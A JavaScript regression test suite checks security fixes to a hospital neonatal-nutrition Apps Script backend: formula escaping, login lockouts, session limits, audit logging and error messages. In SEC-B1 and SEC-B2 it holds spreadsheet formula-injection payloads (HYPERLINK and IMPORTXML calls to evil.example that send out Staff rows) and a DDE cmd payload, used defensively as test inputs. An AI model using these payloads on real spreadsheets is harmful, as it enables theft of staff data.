// verify-review-0917-backend-security.cjs — pins the auth / injection / audit
// fixes from the 2026-09-17 backend review (findings SEC-B1..B15, the key-shape
// nits, UP-B14, and Praew's decisions A5 hd-prep and A6 session caps).
//
// Drives the real gas-backend.gs through doPost where the fix is a response
// contract (ServiceUnavailable, SessionMaxAge, no-echo), and calls functions
// directly where the fix is internal. See gas-vm-sandbox.cjs for what the
// Sheets/Cache/Lock double models. No npm dependencies.
//
// Fails against the pre-review source (42ce553) — run it with
// NEOFEED_GAS_SRC=<path to that file> to see it.
process.env.TZ = process.env.TZ || 'Asia/Bangkok';
const crypto = require('crypto');
const { boot, recorder, withNow } = require('./gas-vm-sandbox.cjs');
const T = recorder('REVIEW 2026-09-17 BACKEND · SECURITY');

const P = (sid, extra) => Object.assign({
  sessionId: sid, name: 'ทารก', initials: 'AB', bw: 900, ga: 28.1, sex: 'boys',
  dob: '2026-09-01', admissionDate: '2026-09-01', twinSuffix: '', status: 'Active',
  currentBed: '', diagnosis: 'RDS', weights: [{ dol: 1, w: 900 }], lengths: [], hcs: [], bedHistory: [],
  statusDate: '', multiplesCount: 0,
}, extra || {});
const E = (extra) => Object.assign({ dol: 16, weight: 950, fluid: 150, gir: 6, pro: 3, kcal: 90,
  na: 3, k: 2, ca: 60, p: 50, enVolPerKg: 20, route: 'PN', calcInput: { a: 1 } }, extra || {});
const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');
const LOGIN_FAILED = 'email หรือรหัสผ่านไม่ถูกต้อง';
const LOCKED = 'ลองใหม่ในอีก 15 นาที — login ผิดพลาดหลายครั้ง';
const SVC = { error: 'ระบบไม่ว่างชั่วคราว — ลองใหม่อีกครั้ง', code: 'ServiceUnavailable', retryable: true };
const H = 3600e3;

T.section('SEC-B1 · nothing written to Audit_Log can become a formula', () => {
  const g = boot();
  g.addStaff('nurse@kcmh.test', 'nurse', 'Nurse-Password-1');
  g.addStaff('admin@kcmh.test', 'admin', 'Admin-Password-1');
  const nt = g.session('nurse@kcmh.test', 'nurse');
  const evil = '=HYPERLINK("https://evil.example/?d="&ENCODEURL(JOIN(",",Staff!A2:H20)),"verify")';
  const r = g.post({ action: 'registerPatient', token: nt, isNew: true, patient: P(evil) });
  T.ok('a registerPatient whose sessionId is a formula still saves', r.ok === true, r);
  T.eq('…and neither the registry nor Audit_Log gained a live formula', g.env.injections, []);
  const at = g.session('admin@kcmh.test', 'admin');
  const d = g.post({ action: 'deletePatient', token: at, sessionId: evil });
  T.ok('deleting it works', d.ok === true, d);
  T.eq('…and the deletePatient audit rows are escaped too', g.env.injections, []);
  T.ok('…while still recording the id (stored as text)', g.audit().some(a => a.action === 'deletePatient' && a.sessionId === evil), g.audit());
  g.post({ action: 'login', email: '=1+1@evil.test', password: 'x' });
  T.eq('a loginFail row for a formula-shaped email is escaped', g.env.injections, []);
});

T.section('SEC-B2 · revisionOf is server-managed, and read-back values are escaped again', () => {
  const g = boot();
  g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
  const dt = g.session('doc@kcmh.test', 'doctor');
  g.post({ action: 'registerPatient', token: dt, isNew: true, patient: P('AB-900') });
  const payload = '=IMPORTXML("https://evil.example/c?"&ENCODEURL(JOIN(",",Staff!A2:H20)),"//a")';
  const c = g.post({ action: 'logDailyNutrition', token: dt, sessionId: 'AB-900', entry: E({ revisionOf: payload, revisionNumber: 7 }) });
  T.ok('create ok', !!c.entryId, c);
  const row = g.rows('Daily_Log')[0];
  T.eq('client revisionOf is ignored (AK blank)', row[36], '');
  T.eq('client revisionNumber is ignored (AJ = 1)', row[35], 1);
  // Plant what a sheet would hand back for text that was stored safely: the
  // bare "=..." without its apostrophe, in AK and AB.
  row[36] = payload; row[27] = '=cmd|"/c calc"!A1';
  const u = g.post({ action: 'updateDailyNutrition', token: dt, sessionId: 'AB-900', entryId: c.entryId, expectedLastModified: row[26], entry: E({ fluid: 160 }) });
  T.ok('an ordinary draft edit succeeds', u.ok === true, u);
  T.eq('…and writes the read-back AK back as text, not a formula', g.env.injections, []);
  T.eq('…AK still holds the text', g.rows('Daily_Log')[0][36], payload);
  // Revision path: AB..AK of the superseded row are written back too.
  const r0 = g.rows('Daily_Log')[0];
  r0[33] = '2026-09-17T01:00:00.000Z'; r0[34] = '=HYPERLINK("x")'; r0[31] = '+SUM(1)';
  const rev = g.post({ action: 'updateDailyNutrition', token: dt, sessionId: 'AB-900', entryId: c.entryId, expectedLastModified: r0[26], entry: E({ fluid: 170 }) });
  T.ok('editing a published row creates a revision', rev.revised === true, rev);
  T.eq('…and the superseded row\'s read-back cells stay text', g.env.injections, []);
  // backfillLegacyEntryIds writes a read-back lastModified.
  const legacy = g.logRow('AB-900', '2026-09-01', { 25: '', 26: '=1+1' });
  g.sheet('Daily_Log').data.push(legacy);
  g.sb.backfillLegacyEntryIds();
  T.eq('backfillLegacyEntryIds escapes the lastModified it writes back', g.env.injections, []);
});

T.section('SEC-B4 · an admin password reset or clear ends existing sessions', () => {
  const g = boot();
  g.addStaff('newhire@kcmh.test', 'nurse', 'Temp-Pass-123');
  const tok = g.session('newhire@kcmh.test', 'nurse');
  T.ok('session works before the reset', Array.isArray(g.post({ action: 'getActivePatients', token: tok }).patients));
  g.sb.setInitialPassword('newhire@kcmh.test', 'Admin-Reset-Pw-2026');
  g.expireStaffCache('newhire@kcmh.test');
  T.eq('setInitialPassword revokes it', g.post({ action: 'getActivePatients', token: tok }), { error: 'Unauthorized' });
  const tok2 = g.session('newhire@kcmh.test', 'nurse');
  g.sb.clearStaffPassword('newhire@kcmh.test');
  g.expireStaffCache('newhire@kcmh.test');
  T.eq('clearStaffPassword revokes it', g.post({ action: 'getActivePatients', token: tok2 }), { error: 'Unauthorized' });
});

T.section('SEC-B5 · parallel guesses are all counted before the hash', () => {
  const g = boot();
  g.addStaff('pw@kcmh.test', 'doctor', 'Correct-Password-1');
  let remaining = 0, armed = false, results = [];
  g.env.hmacHook = () => {
    if (!armed) return;
    armed = false;
    if (remaining > 0) {
      remaining--; armed = true;
      results.push(g.post({ action: 'login', email: 'pw@kcmh.test', password: 'guess-' + Math.random() }));
    }
  };
  let checked = 0, total = 0;
  for (let wave = 0; wave < 4; wave++) {
    results = []; remaining = 19; armed = true;
    results.push(g.post({ action: 'login', email: 'pw@kcmh.test', password: 'guess-' + Math.random() }));
    armed = false;
    total += results.length;
    checked += results.filter(x => x.error === LOGIN_FAILED).length;
  }
  g.env.hmacHook = null;
  // Each request fires the next one from inside its own hash, so they overlap
  // the way a parallel burst does. Once locked, a request never reaches the
  // hash and the chain stops — hence "at least 20 fired", not exactly 80.
  T.ok('a burst of overlapping guesses: at most 5 reach the password check', checked <= 5 && total >= 20, { checked, total });
  T.eq('the account is now locked', g.post({ action: 'login', email: 'pw@kcmh.test', password: 'Correct-Password-1' }).error, LOCKED);
  T.ok('the counter lives under a hashed key', g.props.has('fail_' + sha('pw@kcmh.test')), [...g.props.keys()]);

  const g2 = boot();
  g2.addStaff('pw@kcmh.test', 'doctor', 'Correct-Password-1');
  for (let i = 0; i < 4; i++) g2.post({ action: 'login', email: 'pw@kcmh.test', password: 'wrong-' + i });
  const ok5 = g2.post({ action: 'login', email: 'pw@kcmh.test', password: 'Correct-Password-1' });
  T.eq('four typos then the right password still signs in', ok5.status, 'ok');
  T.ok('…and a successful sign-in clears the counter', !g2.props.has('fail_' + sha('pw@kcmh.test')));
  const t = g2.session('pw@kcmh.test', 'doctor');
  const g3wrong = [];
  for (let i = 0; i < 5; i++) g3wrong.push(g2.post({ action: 'changePassword', token: t, oldPassword: 'nope-' + i, newPassword: 'Another-Pass-9' }).error);
  T.eq('changePassword: the 6th oldPassword guess is locked out', g2.post({ action: 'changePassword', token: t, oldPassword: 'Correct-Password-1', newPassword: 'Another-Pass-9' }).error,
    'ลองใหม่ในอีก 15 นาที — กรอกรหัสผ่านเดิมผิดหลายครั้ง');
  T.ok('…counted under a hashed key', g2.props.has('pwdchg_fail_' + sha('pw@kcmh.test')), [...g2.props.keys()]);
});

T.section('SEC-B8 · no account enumeration on the password path', () => {
  const g = boot();
  g.addStaff('pw@kcmh.test', 'doctor', 'Correct-Password-1');
  g.addStaff('gdoc@gmail.com', 'doctor', '');
  g.addStaff('newhire@kcmh.test', 'nurse', '');
  const L = (email) => g.post({ action: 'login', email, password: 'wrong-guess-123' });
  const answers = ['nobody@kcmh.test', 'pw@kcmh.test', 'gdoc@gmail.com', 'newhire@kcmh.test'].map(e => L(e).error);
  T.eq('unknown / wrong password / Google staff / unprovisioned all get one message', answers, [LOGIN_FAILED, LOGIN_FAILED, LOGIN_FAILED, LOGIN_FAILED]);
  g.env.hmacCalls = 0;
  L('someone-else@kcmh.test');
  T.ok('an unknown email still pays for a full hash (timing)', g.env.hmacCalls >= 3000, g.env.hmacCalls);
  const propsBefore = g.props.size;
  for (let i = 0; i < 5; i++) L('ghost@kcmh.test');
  T.eq('the 6th try on an unknown email gets the same lockout message as a real account', L('ghost@kcmh.test').error, LOCKED);
  T.eq('…counted without creating any Script Property', g.props.size, propsBefore);
  T.ok('…under a hashed CacheService key', g.cacheStore.has('lfail_' + sha('ghost@kcmh.test')) &&
    ![...g.cacheStore.keys()].some(k => k.includes('ghost')), [...g.cacheStore.keys()]);
});

T.section('A5 / SEC-B7 · Google hd restriction prepared, default off, with telemetry', () => {
  const now = Math.floor(Date.now() / 1000);
  const token = (email, hd) => ({ code: 200, body: JSON.stringify(Object.assign({ aud: 'client-id.apps.googleusercontent.com',
    iss: 'https://accounts.google.com', exp: String(now + 3600), email, email_verified: 'true' }, hd ? { hd } : {})) });
  const g = boot();
  g.addStaff('staff@chula.ac.th', 'doctor', '');
  g.addStaff('g@gmail.com', 'nurse', '');
  g.addStaff('pw@redcross.or.th', 'admin', 'Correct-Password-1');
  T.eq('GOOGLE_HD_ENFORCE ships false', g.sb.GOOGLE_HD_ENFORCE, false);
  g.env.urlFetch = token('staff@chula.ac.th', 'chula.ac.th');
  T.eq('verifyGoogleIdToken returns hd', g.sb.verifyGoogleIdToken('t').hd, 'chula.ac.th');
  T.eq('off: a Workspace login with hd works', g.post({ action: 'login', googleToken: 't' }).status, 'ok');
  T.eq('…and records hd_seen_<domain> = yes', g.props.get('hd_seen_chula.ac.th'), 'yes');
  g.env.urlFetch = token('staff@chula.ac.th', '');
  T.eq('off: the same address WITHOUT hd still works', g.post({ action: 'login', googleToken: 't' }).status, 'ok');
  T.eq('…and flips the telemetry to no', g.props.get('hd_seen_chula.ac.th'), 'no');
  g.env.urlFetch = token('staff@chula.ac.th', 'chula.ac.th');
  g.post({ action: 'login', googleToken: 't' });
  T.eq('"no" is sticky — one hd-less sign-in makes enforcing unsafe', g.props.get('hd_seen_chula.ac.th'), 'no');
  g.env.urlFetch = token('g@gmail.com', '');
  g.post({ action: 'login', googleToken: 't' });
  T.ok('no telemetry for gmail.com, and no email in any key', ![...g.props.keys()].some(k => /gmail|@/.test(k)), [...g.props.keys()]);

  g.sb.GOOGLE_HD_ENFORCE = true;
  g.env.urlFetch = token('pw@redcross.or.th', '');
  const refused = g.post({ action: 'login', googleToken: 't' });
  T.eq('on: a consumer Google account on a password domain is refused', refused, { status: 'unauthorized', error: 'บัญชีนี้ต้องเข้าสู่ระบบด้วย email และรหัสผ่าน' });
  g.env.urlFetch = token('staff@chula.ac.th', '');
  T.eq('on: a Workspace address without hd is refused', g.post({ action: 'login', googleToken: 't' }).status, 'unauthorized');
  g.env.urlFetch = token('staff@chula.ac.th', 'chula.ac.th');
  T.eq('on: a Workspace address with matching hd is accepted', g.post({ action: 'login', googleToken: 't' }).status, 'ok');
  g.env.urlFetch = token('g@gmail.com', '');
  T.eq('on: gmail.com is accepted', g.post({ action: 'login', googleToken: 't' }).status, 'ok');
});

T.section('A6 / SEC-B9 · absolute 12 h session age, legacy sessions stamped not dropped', () => {
  const g = boot();
  g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
  const t0 = Date.now();
  const tok = withNow(t0, () => g.session('doc@kcmh.test', 'doctor'));
  T.ok('createSession stores issuedAt', JSON.parse(g.cacheStore.get('sess_' + tok).v).issuedAt === t0);
  let alive = [5, 10, 11.9].map(h => withNow(t0 + h * H, () => { g.expireStaffCache('doc@kcmh.test'); return !!g.sb.verifyToken(tok); }));
  T.eq('used every few hours, it stays valid up to 12 h', alive, [true, true, true]);
  const late = withNow(t0 + 12.05 * H, () => g.post({ action: 'getActivePatients', token: tok }));
  T.eq('past 12 h doPost answers Unauthorized with reason SessionMaxAge', late, { error: 'Unauthorized', reason: 'SessionMaxAge' });
  T.ok('…and the session is removed', !g.cacheStore.has('sess_' + tok));

  // A session issued before this deploy: no issuedAt in the cached value.
  const L0 = Date.now();
  const legacy = 'legacy-token-' + crypto.randomUUID();
  withNow(L0, () => g.sb.CacheService.getScriptCache().put('sess_' + legacy,
    JSON.stringify({ email: 'doc@kcmh.test', role: 'doctor', name: 'D', epoch: '0', mustChangePassword: false }), 21600));
  const first = withNow(L0 + 1 * H, () => g.post({ action: 'getActivePatients', token: legacy }));
  T.ok('a pre-deploy session is NOT logged out by the deploy', Array.isArray(first.patients), first);
  T.eq('…it is stamped issuedAt = its first verification', JSON.parse(g.cacheStore.get('sess_' + legacy).v).issuedAt, L0 + 1 * H);
  const mid = withNow(L0 + 6 * H, () => !!g.sb.verifyToken(legacy));
  const mid2 = withNow(L0 + 11 * H, () => !!g.sb.verifyToken(legacy));
  T.ok('…and runs the full 12 h from then', mid && mid2);
  const end = withNow(L0 + 13.2 * H, () => g.post({ action: 'getActivePatients', token: legacy }));
  T.eq('…then gets SessionMaxAge like any other', end, { error: 'Unauthorized', reason: 'SessionMaxAge' });
});

T.section('SEC-B10 · backfillDefaultPasswords never logs a temp password', () => {
  const g = boot();
  g.sheet('Staff').data.push(['nurse2@kcmh.test', 'nurse', 'N2', true, '', '', '', '']);
  const ret = g.sb.backfillDefaultPasswords();
  const temp = g.rows('Staff')[0][7];
  T.ok('a temp password was provisioned into col H', typeof temp === 'string' && temp.length >= 8, temp);
  T.ok('…the execution log does not contain it', !g.env.logs.some(l => l.includes(temp)), g.env.logs);
  T.ok('…nor does the return value', !JSON.stringify(ret).includes(temp), ret);
  T.ok('…which still reports the count and the email', /1/.test(JSON.stringify(ret)) && JSON.stringify(ret).includes('nurse2@kcmh.test'), ret);
});

T.section('SEC-B11 · non-string inputs cannot slip past a length or identity check', () => {
  const g = boot();
  g.addStaff('pw@kcmh.test', 'doctor', 'Existing-Pass-1');
  const t = g.session('pw@kcmh.test', 'doctor');
  const hashBefore = g.rows('Staff')[0][4];
  T.ok('newPassword 7 (a number) is refused', !!g.post({ action: 'changePassword', token: t, oldPassword: 'Existing-Pass-1', newPassword: 7 }).error);
  T.ok('a 257-character newPassword is refused', !!g.post({ action: 'changePassword', token: t, oldPassword: 'Existing-Pass-1', newPassword: 'x'.repeat(257) }).error);
  T.ok('a non-string oldPassword is refused', !!g.post({ action: 'changePassword', token: t, oldPassword: 12345678901, newPassword: 'Good-New-Pass-1' }).error);
  T.eq('…and the stored hash never changed', g.rows('Staff')[0][4], hashBefore);
  T.eq('login with a numeric email is a plain refusal', g.post({ action: 'login', email: 42, password: 'x' }).status, 'unauthorized');
  T.eq('login with a numeric password is a plain refusal', g.post({ action: 'login', email: 'pw@kcmh.test', password: 1234567890 }).status, 'unauthorized');
  T.eq('updateDailyNutrition with a numeric entryId', g.post({ action: 'updateDailyNutrition', token: t, sessionId: 'X', entryId: 123456, entry: E() }), { error: 'entryId is required' });
  T.eq('logDailyNutrition with a numeric sessionId', g.post({ action: 'logDailyNutrition', token: t, sessionId: 900, entry: E() }), { error: 'sessionId is required' });
});

T.section('SEC-B13 / contract B · a Google service failure is ServiceUnavailable, never Unauthorized', () => {
  const g = boot();
  g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
  const tok = g.session('doc@kcmh.test', 'doctor');
  g.env.cacheThrows = true;
  T.eq('CacheService throwing', g.post({ action: 'getActivePatients', token: tok }), SVC);
  g.env.cacheThrows = false;
  g.env.propsThrow = true;
  T.eq('PropertiesService throwing (epoch read)', g.post({ action: 'getActivePatients', token: tok }), SVC);
  g.env.propsThrow = false;
  g.expireStaffCache('doc@kcmh.test');
  g.env.openByIdThrows = 'Service Spreadsheets timed out while accessing document';
  T.eq('Sheets throwing on the Staff re-read', g.post({ action: 'getActivePatients', token: tok }), SVC);
  g.env.openByIdThrows = null;
  T.ok('the session survives all three and works after recovery', Array.isArray(g.post({ action: 'getActivePatients', token: tok }).patients));
  T.eq('a write during an outage gets the same answer', (() => { g.env.cacheThrows = true; const r = g.post({ action: 'logDailyNutrition', token: tok, sessionId: 'X', entry: E() }); g.env.cacheThrows = false; return r; })(), SVC);
  T.eq('an unknown token is plain Unauthorized', g.post({ action: 'getActivePatients', token: 'no-such-token-at-all' }), { error: 'Unauthorized' });
  T.eq('an over-long token is Unauthorized, not a cache-key error', g.post({ action: 'getActivePatients', token: 'x'.repeat(300) }), { error: 'Unauthorized' });
  g.sb.bumpUserEpoch('doc@kcmh.test');
  T.eq('an epoch-revoked session is plain Unauthorized', g.post({ action: 'getActivePatients', token: tok }), { error: 'Unauthorized' });
});

T.section('SEC-B15 · audit gaps closed; destructive actions audit first', () => {
  const g = boot();
  g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
  g.addStaff('admin@kcmh.test', 'admin', 'Admin-Password-1');
  g.post({ action: 'login', email: 'doc@kcmh.test', password: 'Doctor-Password-1' });
  T.ok('a successful login is audited with the actor', g.audit().some(a => a.action === 'login' && a.actor === 'doc@kcmh.test'), g.audit());
  for (let i = 0; i < 7; i++) g.post({ action: 'login', email: 'doc@kcmh.test', password: 'wrong-' + i });
  const fails = g.audit().filter(a => a.action === 'loginFail').length;
  const locks = g.audit().filter(a => a.action === 'lockout').length;
  T.eq('five checked wrong passwords → five loginFail rows (refused-while-locked adds none)', fails, 5);
  T.eq('…and exactly one lockout row', locks, 1);
  const dt = g.session('doc@kcmh.test', 'doctor');
  const at = g.session('admin@kcmh.test', 'admin');
  g.post({ action: 'registerPatient', token: dt, isNew: true, patient: P('AB-900') });
  g.post({ action: 'updateWeights', token: dt, sessionId: 'AB-900', weights: [{ dol: 1, w: 900 }, { dol: 2, w: 910 }] });
  T.ok('updateWeights is audited', g.audit().some(a => a.action === 'updateWeights' && a.sessionId === 'AB-900'), g.audit());
  g.post({ action: 'getActivePatients', token: at, includeArchived: true });
  T.ok('an honoured archive read is audited as readRegistryArchive', g.audit().some(a => a.action === 'readRegistryArchive' && a.actor === 'admin@kcmh.test'));
  const before = g.audit().length;
  g.post({ action: 'getActivePatients', token: dt, includeArchived: true });
  T.eq('a doctor asking for the archive is an ordinary readRegistry', g.audit().slice(before).map(a => a.action), ['readRegistry']);
  g.post({ action: 'changePassword', token: dt, oldPassword: 'Doctor-Password-1', newPassword: 'Doctor-Password-2' });
  // the account is locked for login, not for changePassword
  T.ok('changePassword is audited', g.audit().some(a => a.action === 'changePassword'), g.audit().slice(-3));

  // Destructive: start row first, and nothing destroyed if it cannot be written.
  const c = g.post({ action: 'logDailyNutrition', token: at, sessionId: 'AB-900', entry: E({ ts: '2026-09-10' }) });
  let auditAtFirstDelete = null;
  g.sheet('Daily_Log').hooks.beforeWrite = (sh, kind) => { if (kind === 'deleteRow' && auditAtFirstDelete === null) auditAtFirstDelete = g.audit().map(a => a.action); };
  const del = g.post({ action: 'deletePatient', token: at, sessionId: 'AB-900' });
  g.sheet('Daily_Log').hooks = {};
  T.ok('deletePatient ok', del.ok === true, del);
  T.ok('"deletePatient:start" was on Audit_Log before the first row was deleted', (auditAtFirstDelete || []).includes('deletePatient:start'), auditAtFirstDelete);
  const acts = g.audit().map(a => a.action);
  T.ok('…and "deletePatient" after it', acts.lastIndexOf('deletePatient') > acts.lastIndexOf('deletePatient:start'), acts);

  const g2 = boot();
  g2.addStaff('admin@kcmh.test', 'admin', 'Admin-Password-1');
  const at2 = g2.session('admin@kcmh.test', 'admin');
  g2.post({ action: 'registerPatient', token: at2, isNew: true, patient: P('CD-1000') });
  const e1 = g2.post({ action: 'logDailyNutrition', token: at2, sessionId: 'CD-1000', entry: E({ ts: '2026-09-10' }) });
  g2.sheet('Audit_Log').throwOn.appendRow = { err: new Error('This action would increase the number of cells in the workbook above the limit of 10000000 cells.') };
  const regBefore = g2.rows('Patient_Registry').length, logBefore = g2.rows('Daily_Log').length;
  T.ok('deletePatient refuses when its audit row cannot be written', !!g2.post({ action: 'deletePatient', token: at2, sessionId: 'CD-1000' }).error);
  T.ok('deleteDailyNutrition refuses likewise', !!g2.post({ action: 'deleteDailyNutrition', token: at2, sessionId: 'CD-1000', entryId: e1.entryId }).error);
  T.ok('pseudonymizePatient refuses likewise', !!g2.post({ action: 'pseudonymizePatient', token: at2, sessionId: 'CD-1000' }).error);
  T.eq('…and nothing was destroyed or erased', [g2.rows('Patient_Registry').length, g2.rows('Daily_Log').length, g2.rows('Patient_Registry')[0][1]],
    [regBefore, logBefore, 'ทารก']);
  g2.sheet('Audit_Log').throwOn = {};
  T.ok('a READ still works when Audit_Log is full (fail-open, UP-B11 unchanged)', (() => {
    g2.sheet('Audit_Log').throwOn.appendRow = { err: new Error('full') };
    const r = g2.post({ action: 'getActivePatients', token: at2 });
    g2.sheet('Audit_Log').throwOn = {};
    return Array.isArray(r.patients);
  })());

  const m = g.sb.usageMetrics([['ts', 'action', 'sessionId', 'actorEmail'],
    ['2026-08-19T03:00:00.000Z', 'readRegistry', '', 'nurse@kcmh.test'],
    ['2026-08-19T03:01:00.000Z', 'loginFail', '', 'attacker1@evil.test'],
    ['2026-08-19T03:02:00.000Z', 'lockout', '', 'attacker2@evil.test']]);
  T.eq('usageMetrics does not count failed sign-ins as active users', m.weeks[0].activeUsers, 1);
});

T.section('nits · key names from SHA-256 of the address; epochs migrate without logging anyone out', () => {
  const g = boot();
  const kA = g.sb._epochKey('a.b@x.test'), kB = g.sb._epochKey('a_b@x.test');
  T.ok('a.b@x and a_b@x no longer share an epoch key', kA !== kB, [kA, kB]);
  T.ok('…and no key contains the address', !kA.includes('a.b') && !kA.includes('x.test'), kA);
  // Migration: a token issued before the deploy carries the OLD key's value.
  g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
  g.props.set('epoch_doc_kcmh_test', '3');
  const pre = 'pre-deploy-' + crypto.randomUUID();
  g.sb.CacheService.getScriptCache().put('sess_' + pre, JSON.stringify({ email: 'doc@kcmh.test', role: 'doctor', name: 'D', epoch: '3', issuedAt: Date.now() }), 21600);
  T.ok('a pre-deploy token (legacy epoch 3) is still valid after the deploy', !!g.sb.verifyToken(pre));
  g.sb.bumpUserEpoch('doc@kcmh.test');
  T.eq('a bump writes the new key above the legacy value', g.props.get('epoch2_' + sha('doc@kcmh.test')), '4');
  T.eq('…and mirrors the legacy key, so a rollback still sees the revocation', g.props.get('epoch_doc_kcmh_test'), '4');
  T.eq('…the pre-deploy token is revoked', g.sb.verifyToken(pre), null);
  // Collision gone once both users have a new-shape key.
  g.addStaff('a.b@x.test', 'nurse', 'Pass-Word-AB-1');
  g.addStaff('a_b@x.test', 'nurse', 'Pass-Word-AB-2');
  g.sb.bumpUserEpoch('a_b@x.test');
  const tokAB = g.session('a_b@x.test', 'nurse');
  g.sb.bumpUserEpoch('a.b@x.test');
  T.ok('a password change for a.b@x no longer signs out a_b@x', !!g.sb.verifyToken(tokAB));
  for (let i = 0; i < 5; i++) g.post({ action: 'login', email: 'a.b@x.test', password: 'wrong-' + i });
  T.eq('five failures on a.b@x do not lock a_b@x', g.post({ action: 'login', email: 'a_b@x.test', password: 'Pass-Word-AB-2' }).status, 'ok');
  g.post({ action: 'login', email: 'doc@kcmh.test', password: 'Doctor-Password-1' });
  const cached = JSON.parse(g.cacheStore.get('staffrc_doc@kcmh.test').v);
  T.eq('the cached Staff row carries no password_hash, salt or temp password', [cached.data[4], cached.data[5], cached.data[7]], ['', '', '']);
});

T.section('nits / UP-B14 · nothing internal is echoed to an unauthenticated caller', () => {
  const g = boot();
  g.env.urlFetch = { code: 400, body: '{"error":"invalid_token","SECRET":"tokeninfo-body-marker"}' };
  const bad = g.postText({ action: 'login', googleToken: 'whatever' });
  T.ok('a rejected token does not echo the tokeninfo body', !bad.includes('tokeninfo-body-marker') && !bad.includes('HTTP'), bad);
  const now = Math.floor(Date.now() / 1000);
  g.env.urlFetch = { code: 200, body: JSON.stringify({ aud: 'someone-elses-client', iss: 'accounts.google.com', exp: String(now + 60), email: 'a@gmail.com', email_verified: true }) };
  const aud = g.postText({ action: 'login', googleToken: 'whatever' });
  T.ok('an aud mismatch does not echo either client id', !aud.includes('client-id.apps') && !aud.includes('someone-elses-client'), aud);
  const junk = g.post('hello, not json');
  T.eq('a malformed body gets a generic Thai message, not the parser error', junk, { error: 'เกิดข้อผิดพลาดในระบบ — ลองใหม่อีกครั้ง' });
  g.props.delete('CLIENT_ID');
  const cfg = g.postText({ action: 'login', googleToken: 'whatever' });
  T.ok('a missing CLIENT_ID is reported without naming the Script Property', !/Script Property|setConfig|CLIENT_ID/.test(cfg) && /server config/.test(cfg), cfg);
  g.props.set('CLIENT_ID', 'client-id.apps.googleusercontent.com');
  const UNAVAIL = { status: 'error', error: 'Google Sign-In ไม่พร้อมใช้งานชั่วคราว — ลองใหม่', code: 'ServiceUnavailable', retryable: true };
  g.env.urlFetch = { code: 503, body: 'backend error marker' };
  T.eq('tokeninfo 5xx is "temporarily unavailable, retry"', g.post({ action: 'login', googleToken: 'whatever' }), UNAVAIL);
  g.env.urlFetchThrows = 'DNS error: oauth2.googleapis.com';
  T.eq('a network exception reaching tokeninfo is the same', g.post({ action: 'login', googleToken: 'whatever' }), UNAVAIL);
});

T.done();
